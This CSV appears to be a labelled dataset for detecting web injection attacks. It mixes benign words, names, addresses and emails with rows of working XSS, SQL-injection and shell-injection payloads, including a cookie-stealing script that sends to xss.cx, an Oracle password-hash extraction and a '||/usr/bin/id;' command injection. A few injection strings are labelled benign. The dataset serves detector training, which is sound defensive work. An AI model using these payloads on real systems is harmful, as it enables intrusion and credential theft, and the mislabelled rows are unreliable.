index,payload,is_malicious,injection_type
107,1258418527208,0.0,LEGAL
108,soberly,0.0,LEGAL
109,Santo+Domingo+de+las+Posadas,0.0,LEGAL
110,Puertollano,0.0,LEGAL
111,exchequers,0.0,LEGAL
112,monostable,0.0,LEGAL
113,http%3A%2F%2Fscouseruggers-realmen.blogspot.com%2F%3Fzx%3D30524bd9ace1c1b2,0.0,LEGAL
114,paneled,0.0,LEGAL
115,rss,0.0,LEGAL
116,threats,0.0,LEGAL
117,explanations,0.0,LEGAL
118,soundings,0.0,LEGAL
119,matibag,0.0,LEGAL
120,http%3A%2F%2Fad.doubleclick.net%2Fad%2FN5043.Yahoo%2FB3311270.246%3Bsz%3D1x1%3Bord%3D1258662142579083%3F,0.0,LEGAL
121,agriculturally,0.0,LEGAL
122,Regla+Casiano,0.0,LEGAL
123,clicking,0.0,LEGAL
124,Brady,0.0,LEGAL
125,submitting,0.0,LEGAL
126,momentousness,0.0,LEGAL
127,gnu,0.0,LEGAL
128,80687672S,0.0,LEGAL
129,"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1.0,SQL
130,abrogating,0.0,LEGAL
131,hovers,0.0,LEGAL
132,requiring,0.0,LEGAL
133,Valdelugueros,0.0,LEGAL
134,63,0.0,LEGAL
135,purposes,0.0,LEGAL
136,Carril+Lloret%2C+52+,0.0,LEGAL
137,Tomasz,0.0,LEGAL
138,scissors,0.0,LEGAL
139,incomprehensibly,0.0,LEGAL
140,reuses,0.0,LEGAL
141,12059554X,0.0,LEGAL
142,Romero+De+Torres%2C+147+9E,0.0,LEGAL
143,"<script>Reflect.construct(function(){new.target.constructor('alert(1)')()},[])</script>",1.0,XSS
144,Panell+Portaneri,0.0,LEGAL
145,7406,0.0,LEGAL
146,9919884875453306,0.0,LEGAL
147,formulario,0.0,LEGAL
148,renken,0.0,LEGAL
149,Vilafam%E9s,0.0,LEGAL
150,specie,0.0,LEGAL
151,Vid%E1ngoz%2FBidankoze,0.0,LEGAL
152,staunchly,0.0,LEGAL
153,canvasser,0.0,LEGAL
154,impotency,0.0,LEGAL
155,curses,0.0,LEGAL
156,prouty%40gnu%F1ez.zw,0.0,LEGAL
157,1257301246938,0.0,LEGAL
158,Mace,0.0,LEGAL
159,; SLEEP(50),1.0,SQL
160,57874290B,0.0,LEGAL
161,motorized,0.0,LEGAL
162,disclosing,0.0,LEGAL
163,doermer%40programasalquilermaquinaria.tl,0.0,LEGAL
164,Rajeev,0.0,LEGAL
165,imagined,0.0,LEGAL
166,a'and/*g*/456=678-- #,1.0,SQL
167,Shakespeare,0.0,LEGAL
168,slates,0.0,LEGAL
169,Ar%E1ndiga,0.0,LEGAL
170,"5"";+echo+""PHP Code"";+$aaa=""",1.0,XSS
171,Tushar,0.0,LEGAL
172,entrenching,0.0,LEGAL
173,definer,0.0,LEGAL
174,6588349336548778,0.0,LEGAL
175,Chungsik,0.0,LEGAL
176,Poldi,0.0,LEGAL
177,replenished,0.0,LEGAL
178,Dhiren,0.0,LEGAL
179,Sieber,0.0,LEGAL
180,rosar%40comercioenlacalle.kp,0.0,LEGAL
181,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",1.0,SQL
182,Calle+Horreo+85+10%3FD,0.0,LEGAL
183,geography,0.0,LEGAL
184,lapsed,0.0,LEGAL
185,Nina,0.0,LEGAL
186,Fadrique,0.0,LEGAL
187,deviates,0.0,LEGAL
188,BarBIheCHO,0.0,LEGAL
189,Marylinda,0.0,LEGAL
190,1257048766386,0.0,LEGAL
191,Babs,0.0,LEGAL
192,Leonela,0.0,LEGAL
193,piccolo,0.0,LEGAL
194,daughtre3,0.0,LEGAL
195,07735031744712506067,0.0,LEGAL
196,chanzoneta,0.0,LEGAL
197,Gomera%2C+S%2FN%2C+2%3FD,0.0,LEGAL
198,tupas,0.0,LEGAL
199,improvisations,0.0,LEGAL
200,castillo%40ajuntamentbcn20.et,0.0,LEGAL
201,flies,0.0,LEGAL
202,90471972T,0.0,LEGAL
203,job,0.0,LEGAL
204,09630796353662826603,0.0,LEGAL
205,<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>,1.0,XSS
206,maycock,0.0,LEGAL
207,gilburt,0.0,LEGAL
208,marella,0.0,LEGAL
209,Walgreen,0.0,LEGAL
210,bathing,0.0,LEGAL
211,Phu,0.0,LEGAL
212,Amber,0.0,LEGAL
213,Sant+Juli%E0+del+Llor+i+Bonmat%ED,0.0,LEGAL
214,4231744159905009,0.0,LEGAL
215,ritually,0.0,LEGAL
216,primary,0.0,LEGAL
217,firdevs7%40fulanitoymenganito.sb,0.0,LEGAL
218,mayo-chandler7%40barnicesuv.co,0.0,LEGAL
219,A8CyF4uzrSN1OvzmzKl13U,0.0,LEGAL
220,Nerty,0.0,LEGAL
221,1717836675629432,0.0,LEGAL
222,garfield,0.0,LEGAL
223,backhand,0.0,LEGAL
224,lischyns,0.0,LEGAL
225,diminuci%F3n,0.0,LEGAL
226,questioningly,0.0,LEGAL
227,grotesques,0.0,LEGAL
228,Santa+Barbara+28+,0.0,LEGAL
229,Micronesia,0.0,LEGAL
230,attainers,0.0,LEGAL
231,pricer,0.0,LEGAL
232,faintness,0.0,LEGAL
233,Liss,0.0,LEGAL
234,nonexistant268220399,0.0,LEGAL
235,ivory,0.0,LEGAL
236,liners,0.0,LEGAL
237,Viktor,0.0,LEGAL
238,Zulema,0.0,LEGAL
239,00132749490636249202,0.0,LEGAL
240,5865350752037017,0.0,LEGAL
241,multiple,0.0,LEGAL
242,1331904332,0.0,LEGAL
243,bloedon,0.0,LEGAL
244,Cenobia,0.0,LEGAL
245,44760,0.0,LEGAL
246,prevention,0.0,LEGAL
247,reinforcing,0.0,LEGAL
248,hellwig_dravic%40chevrolet-volt.cz,0.0,LEGAL
249,backy%40legami.tz,0.0,LEGAL
250,Porro,0.0,LEGAL
251,empowering,0.0,LEGAL
252,Calle+Biznaga%2C+5+,0.0,LEGAL
253,Pl.+Circular%2C+S%2FN%2C+11%3FA,0.0,LEGAL
254,6i97s9r02t1,0.0,LEGAL
255,Llambilles,0.0,LEGAL
256,violets,0.0,LEGAL
257,C%2F+Manuel+R.+Alvarez+156%2C+8%3FG,0.0,LEGAL
258,Mon%F3var%2FMon%F2ver,0.0,LEGAL
259,50015038,0.0,LEGAL
260,Helguera+Fern%E1ndez,0.0,LEGAL
261,accuser,0.0,LEGAL
262,1755897947554799,0.0,LEGAL
263,Wilkie,0.0,LEGAL
264,conversely,0.0,LEGAL
265,62397798V,0.0,LEGAL
266,proscription,0.0,LEGAL
267,issues,0.0,LEGAL
268,despaired,0.0,LEGAL
269,cheeky,0.0,LEGAL
270,Lionel,0.0,LEGAL
271,reproducer,0.0,LEGAL
272,oestreic,0.0,LEGAL
273,motion+picture+theaters,0.0,LEGAL
274,lost+found,0.0,LEGAL
275,"<!a foo=x=`y><img alt=""`><img src=x:x onerror=alert(2)//"">",1.0,XSS
276,lead,0.0,LEGAL
277,Em%E9rito,0.0,LEGAL
278,hambrear,0.0,LEGAL
279,h958013a,0.0,LEGAL
280,1599,0.0,LEGAL
281,deception,0.0,LEGAL
282,Juan+de+Dios,0.0,LEGAL
283,herewith,0.0,LEGAL
284,potent,0.0,LEGAL
285,nakatsu,0.0,LEGAL
286,marinate,0.0,LEGAL
287,deafness,0.0,LEGAL
288,l4nz4l,0.0,LEGAL
289,13859230864658281051,0.0,LEGAL
290,Mort,0.0,LEGAL
291,marijke,0.0,LEGAL
292,ambuscade,0.0,LEGAL
293,l680jis45,0.0,LEGAL
294,25270,0.0,LEGAL
295,kuravlev%40minimizar.ve,0.0,LEGAL
296,eggebraa,0.0,LEGAL
297,alleyn,0.0,LEGAL
298,symptomatic,0.0,LEGAL
299,A8CyF4uzrSN1OvzmzKWtJ2,0.0,LEGAL
300,incrementally,0.0,LEGAL
301,Calle+Do+Fuso+19+,0.0,LEGAL
302,-93+or+1,0.0,LEGAL
303,9635,0.0,LEGAL
304,08410,0.0,LEGAL
305,oven,0.0,LEGAL
306,tunnels,0.0,LEGAL
307,oppressed,0.0,LEGAL
308,Visitaci%F3n,0.0,LEGAL
309,confiscating,0.0,LEGAL
310,5469681368008554,0.0,LEGAL
311,ac4e4865r,0.0,LEGAL
312,accused,0.0,LEGAL
313,Christianizers,0.0,LEGAL
314,muffin,0.0,LEGAL
315,76,0.0,LEGAL
316,Pansie,0.0,LEGAL
317,pittam,0.0,LEGAL
318,hostile,0.0,LEGAL
319,courier,0.0,LEGAL
320,251363922,0.0,LEGAL
321,84849416R,0.0,LEGAL
322,230|utmcmd,0.0,LEGAL
323,Pythagorean,0.0,LEGAL
324,admired,0.0,LEGAL
325,instant,0.0,LEGAL
326,Scandinavian,0.0,LEGAL
327,C%2F+Pe%F1a+Lara%2C+52%2C+7%3FB,0.0,LEGAL
328,fixedness,0.0,LEGAL
329,Ganges,0.0,LEGAL
330,C%2F+Tratado+De+Roma+128+1%3FG,0.0,LEGAL
331,Otmar,0.0,LEGAL
332,3410,0.0,LEGAL
333,solicits,0.0,LEGAL
334,Ajay,0.0,LEGAL
335,1077,0.0,LEGAL
336,gherardo,0.0,LEGAL
337,chord,0.0,LEGAL
338,Sheilah,0.0,LEGAL
339,salivary,0.0,LEGAL
340,pipelining,0.0,LEGAL
341,32634,0.0,LEGAL
342,Guiral+De+la+Fuente,0.0,LEGAL
343,Delaware%2C+N.+1400-1529,0.0,LEGAL
344,mentally,0.0,LEGAL
345,regained,0.0,LEGAL
346,Erlindo,0.0,LEGAL
347,gigavolt,0.0,LEGAL
348,Villamanrique+de+la+Condesa,0.0,LEGAL
349,making,0.0,LEGAL
350,Bendite,0.0,LEGAL
351,strengths,0.0,LEGAL
352,skinned,0.0,LEGAL
353,administracio,0.0,LEGAL
354,fisher,0.0,LEGAL
355,Cerpa+Oitav%E9n,0.0,LEGAL
356,denial,0.0,LEGAL
357,Fastmer,0.0,LEGAL
358,c1s92be4e29,0.0,LEGAL
359,99431698F,0.0,LEGAL
360,Assass%EDn+Cl%E9rici,0.0,LEGAL
361,salerno.harmer%40nexuspark.li,0.0,LEGAL
362,charisse,0.0,LEGAL
363,http%3A%2F%2Fwww.donkeylicious.com%2F2009%2F03%2Fcheat-sheets.html,0.0,LEGAL
364,specialized,0.0,LEGAL
365,limiter,0.0,LEGAL
366,&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;,1.0,XSS
367,Altos,0.0,LEGAL
368,snuggle,0.0,LEGAL
369,Iracema,0.0,LEGAL
370,Mar%EDa,0.0,LEGAL
371,encode,0.0,LEGAL
372,Cherice,0.0,LEGAL
373,<font style='color:expression(alert('XSS'))'>,1.0,XSS
374,Enis,0.0,LEGAL
375,stanchest,0.0,LEGAL
376,create user name identified by pass123 temporary tablespace temp default tablespace users;,1.0,SQL
377,<scr%00ipt%20&message=> alert(‘X’)</script>,1.0,XSS
378,uphill,0.0,LEGAL
379,pattern,0.0,LEGAL
380,aspirates,0.0,LEGAL
381,Orelee,0.0,LEGAL
382,Dvs,0.0,LEGAL
383,Mirambel,0.0,LEGAL
384,Bu7arD9,0.0,LEGAL
385,Gast%F3n,0.0,LEGAL
386,"""><script>document.body.innerHTML=""<a onmouseover%0B=location='\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x61\x6C\x65\x72\x74\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B'><input name=attributes>"";</script>",1.0,XSS
387,incredulously,0.0,LEGAL
388,expr\65 ssion(URL=0),1.0,XSS
389,Analiese,0.0,LEGAL
390,Shou,0.0,LEGAL
391,expires,0.0,LEGAL
392,discouragement,0.0,LEGAL
393,carras%40quiromante.vi,0.0,LEGAL
394,hijack,0.0,LEGAL
395,classifiable,0.0,LEGAL
396,Fagin,0.0,LEGAL
397,Viki,0.0,LEGAL
398,perceiving,0.0,LEGAL
399,1331909377,0.0,LEGAL
400,visualizing,0.0,LEGAL
401,Iraola+Rudi,0.0,LEGAL
402,C%2F+Patricio+Saenz%2C+153%2C+12E,0.0,LEGAL
403,Dedra,0.0,LEGAL
404,2409731978356224,0.0,LEGAL
405,Lacavex+Lafont,0.0,LEGAL
406,ambrosi,0.0,LEGAL
407,9993912962244867,0.0,LEGAL
408,innermost,0.0,LEGAL
409,hakeem,0.0,LEGAL
410,belle,0.0,LEGAL
411,continuities,0.0,LEGAL
412,5osan%249a,0.0,LEGAL
413,Hannah,0.0,LEGAL
414,45510,0.0,LEGAL
415,Drona,0.0,LEGAL
416,typography,0.0,LEGAL
417,fried%40legami.sj,0.0,LEGAL
418,06330,0.0,LEGAL
419,maisonne,0.0,LEGAL
420,"<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",1.0,XSS
421,dependently,0.0,LEGAL
422,ì><sî%2bîcript>alert(document.cookie)</script>,1.0,XSS
423,quieting,0.0,LEGAL
424,wails,0.0,LEGAL
425,CIUDaDaN%CDA,0.0,LEGAL
426,Av.+Don+Juan+De+Borbon%2C+S%2FN+,0.0,LEGAL
427,nonetheless,0.0,LEGAL
428,Atreus,0.0,LEGAL
429,Marjorie,0.0,LEGAL
430,impaired,0.0,LEGAL
431,"<a href=""\\xE2\\x81\\x9Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1.0,XSS
432,6820667917309161,0.0,LEGAL
433,78218686X,0.0,LEGAL
434,cherwin4%40xavipetit.mu,0.0,LEGAL
435,8588111212393329,0.0,LEGAL
436,civilizations,0.0,LEGAL
437,renaming,0.0,LEGAL
438,39sch6nz6da,0.0,LEGAL
439,29Ra687aD5,0.0,LEGAL
440,intrigue,0.0,LEGAL
441,8527,0.0,LEGAL
442,46624,0.0,LEGAL
443,06173,0.0,LEGAL
444,recirculates,0.0,LEGAL
445,debility,0.0,LEGAL
446,<BODY ONLOAD=alert(1)>,1.0,XSS
447,docs51,0.0,LEGAL
448,furlough,0.0,LEGAL
449,harvison,0.0,LEGAL
450,Bringu%E9+Mulleras,0.0,LEGAL
451,32112,0.0,LEGAL
452,organization,0.0,LEGAL
453,Villaturiel,0.0,LEGAL
454,25960678A,0.0,LEGAL
455,22373,0.0,LEGAL
456,weenie,0.0,LEGAL
457,handshake,0.0,LEGAL
458,papyrus,0.0,LEGAL
459,charities,0.0,LEGAL
460,Christianizations,0.0,LEGAL
461,<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('CrossSiteScripting')></OBJECT>,1.0,XSS
462,jealousies,0.0,LEGAL
463,figuring,0.0,LEGAL
464,Amaury,0.0,LEGAL
465,6a652mb2,0.0,LEGAL
466,nonexistant61968255,0.0,LEGAL
467,4354c07a,0.0,LEGAL
468,Monte,0.0,LEGAL
469,plummet,0.0,LEGAL
470,San+Jos%E9+del+Valle,0.0,LEGAL
471,'><A CLASS=X></A>,1.0,XSS
472,dispelling,0.0,LEGAL
473,0KmSXmTCbvzIj9s9p1-o2w,0.0,LEGAL
474,Zellerbach,0.0,LEGAL
475,02215,0.0,LEGAL
476,computability,0.0,LEGAL
477,12588,0.0,LEGAL
478,kinetic,0.0,LEGAL
479,25684857K,0.0,LEGAL
480,consistent,0.0,LEGAL
481,Jimeno,0.0,LEGAL
482,"&lt;SCRIPT/X SRC=""http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp""&gt;&lt;/SCRIPT&gt;",1.0,XSS
483,golfer,0.0,LEGAL
484,reduced,0.0,LEGAL
485,"""><SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://127.0.0.1:3555/xss_serve_payloads/X.js""></SCRIPT>",1.0,XSS
486,particulate,0.0,LEGAL
487,tallness,0.0,LEGAL
488,_vti_conf,0.0,LEGAL
489,ftp,0.0,LEGAL
490,Avinguda+Mas+Fuster+175+8B,0.0,LEGAL
491,d6917bi52to,0.0,LEGAL
492,Sherwood,0.0,LEGAL
493,demeanor,0.0,LEGAL
494,<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>,1.0,XSS
495,happiness,0.0,LEGAL
496,18370,0.0,LEGAL
497,substantiates,0.0,LEGAL
498,tard%F3n,0.0,LEGAL
499,typo,0.0,LEGAL
500,C%2F+Robaleira+127+10H,0.0,LEGAL
501,nogueira%40magritte.ly,0.0,LEGAL
502,Aguinaga+Achutegui,0.0,LEGAL
503,C%2F+Cartagena%2C+188%2C+,0.0,LEGAL
504,Cotanes+del+Monte,0.0,LEGAL
505,45543038W,0.0,LEGAL
506,slopping,0.0,LEGAL
507,trough,0.0,LEGAL
508,guida%40travelzone.zw,0.0,LEGAL
509,Porte,0.0,LEGAL
510,||/usr/bin/id;,1.0,SHELL
511,bain%40raullazaro.pm,0.0,LEGAL
512,moro.saldana%40indianepal.sy,0.0,LEGAL
513,"<script>document.write(""<img src=//xss.cx/"" + document.cookie + "">"")</script>",1.0,XSS
514,seamy,0.0,LEGAL
515,galactic,0.0,LEGAL
516,Langa+del+Castillo,0.0,LEGAL
517,Napole%F3n,0.0,LEGAL
518,peacocks,0.0,LEGAL
519,22215,0.0,LEGAL
520,divan,0.0,LEGAL
521,Carolayn,0.0,LEGAL
522,http%3A%2F%2Fdamncoolpics.blogspot.com%2F2009%2F08%2Fplus-size-models.html,0.0,LEGAL
523,"<link rel=""import"" href=""//xss.cx"">",1.0,XSS
524,Al%ED,0.0,LEGAL
525,"<img \\x11src=x onerror=""javascript:alert(1)"">",1.0,XSS
526,99783130E,0.0,LEGAL
527,Chattahoochee,0.0,LEGAL
528,123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2C%28CASE%20WHEN%20%286349=6349%2F%2A%2150521%20AND%206349=6350%2A%2F%29%20THEN%201%20ELSE%200%20END%29%2C0x3a6270793a%29%23,1.0,SQL
529,retention,0.0,LEGAL
530,keep,0.0,LEGAL
531,http%3A%2F%2Farquitecturamashistoria.blogspot.com%2F,0.0,LEGAL
532,window.name='hacked';location.replace('about:blank');,1.0,XSS
533,C%2F+Comunidad+De+La+Rioja%2C+95+,0.0,LEGAL
534,aUseNT%2BE,0.0,LEGAL
535,Cr%E9menes,0.0,LEGAL
536,45262917K,0.0,LEGAL
537,Sieglinda,0.0,LEGAL
538,unfaithfulness,0.0,LEGAL
539,4761952395684285,0.0,LEGAL
540,Evette,0.0,LEGAL
541,Deirdre,0.0,LEGAL
542,72824002E,0.0,LEGAL
543,Fidencio,0.0,LEGAL
544,6410439898425847,0.0,LEGAL
545,Fililberto,0.0,LEGAL
546,<!-- -- --><script>document.cookie=true;</script><!-- -- -->,1.0,XSS
547,fraternal,0.0,LEGAL
548,M,0.0,LEGAL
549,Isaacs,0.0,LEGAL
550,weakened,0.0,LEGAL
551,5268785039197968,0.0,LEGAL
552,Danization,0.0,LEGAL
553,minimax,0.0,LEGAL
554,backtrack,0.0,LEGAL
555,popularity,0.0,LEGAL
556,refuge,0.0,LEGAL
557,80u5rru9ca0,0.0,LEGAL
558,Cluet+Higuerue,0.0,LEGAL
559,recruiting,0.0,LEGAL
560,Calle+Virgen+Del+Espino+S%2FN%2C+,0.0,LEGAL
561,auspiciously,0.0,LEGAL
562,'><body onload=prompt(1);>,1.0,XSS
563,Riotorto,0.0,LEGAL
564,Sinesio,0.0,LEGAL
565,"""`\'><script>-javascript:alert(1)</script>",1.0,XSS
566,clearing,0.0,LEGAL
567,%2C1994,0.0,LEGAL
568,Calle+Matula%2C+S%2FN%2C+,0.0,LEGAL
569,Pullmans,0.0,LEGAL
570,syndrome,0.0,LEGAL
571,radical,0.0,LEGAL
572,scares,0.0,LEGAL
573,retransmitting,0.0,LEGAL
574,Inessa,0.0,LEGAL
575,directora,0.0,LEGAL
576,Antigua,0.0,LEGAL
577,summertime,0.0,LEGAL
578,3933161226854157,0.0,LEGAL
579,21335513T,0.0,LEGAL
580,20244752Z,0.0,LEGAL
581,Berroteran,0.0,LEGAL
582,injurious,0.0,LEGAL
583,accident,0.0,LEGAL
584,Andalusian,0.0,LEGAL
585,overhangs,0.0,LEGAL
586,Amengual+Casanova,0.0,LEGAL
587,idolatry,0.0,LEGAL
588,"""`'><script>\x0Ajavascript:alert(1)</script>",1.0,XSS
589,grieved,0.0,LEGAL
590,22390,0.0,LEGAL
591,bmw,0.0,LEGAL
592,directrices,0.0,LEGAL
593,nearsighted,0.0,LEGAL
594,Centeno+Polanco,0.0,LEGAL
595,bubbling,0.0,LEGAL
596,desoer,0.0,LEGAL
597,creep,0.0,LEGAL
598,nationalizing,0.0,LEGAL
599,curfews,0.0,LEGAL
600,Teodorico,0.0,LEGAL
601,05202,0.0,LEGAL
602,craggy,0.0,LEGAL
603,Tarrah,0.0,LEGAL
604,b3r3al,0.0,LEGAL
605,Action,0.0,LEGAL
606,"|ping,-w,10000,-n,1,1.2.3.4|rem,",0.0,LEGAL
607,foundation,0.0,LEGAL
608,1331889954343,0.0,LEGAL
609,Pe%F1a+Bejande+138%2C+,0.0,LEGAL
610,democracies,0.0,LEGAL
611,<script itworksinallbrowsers>/*<script* */confirm(1)</script,1.0,XSS
612,Pension,0.0,LEGAL
613,derived,0.0,LEGAL
614,4487805081859953,0.0,LEGAL
615,Tutusaus,0.0,LEGAL
616,Pera%2C+La,0.0,LEGAL
617,43338572V,0.0,LEGAL
618,Ca%F1adillas+Almendro,0.0,LEGAL
619,iris,0.0,LEGAL
620,Prescott,0.0,LEGAL
621,consonant,0.0,LEGAL
622,judy,0.0,LEGAL
623,Stanislas,0.0,LEGAL
624,6556979183874771,0.0,LEGAL
625,Salvadoran,0.0,LEGAL
626,schism,0.0,LEGAL
627,Darlene,0.0,LEGAL
628,&o=%22%3E%3Cscript%3Evar%20asd='&id=';alert(document.cookie)%3C/script%3E&c=1&v=2&xc=A7E3B9E1#,1.0,XSS
629,Pac,0.0,LEGAL
630,03092401964866703298,0.0,LEGAL
631,doorkeeper,0.0,LEGAL
632,-654+or+1,0.0,LEGAL
633,delimited,0.0,LEGAL
634,Barranco,0.0,LEGAL
635,Tatyana,0.0,LEGAL
636,lawfully,0.0,LEGAL
637,7340,0.0,LEGAL
638,329,0.0,LEGAL
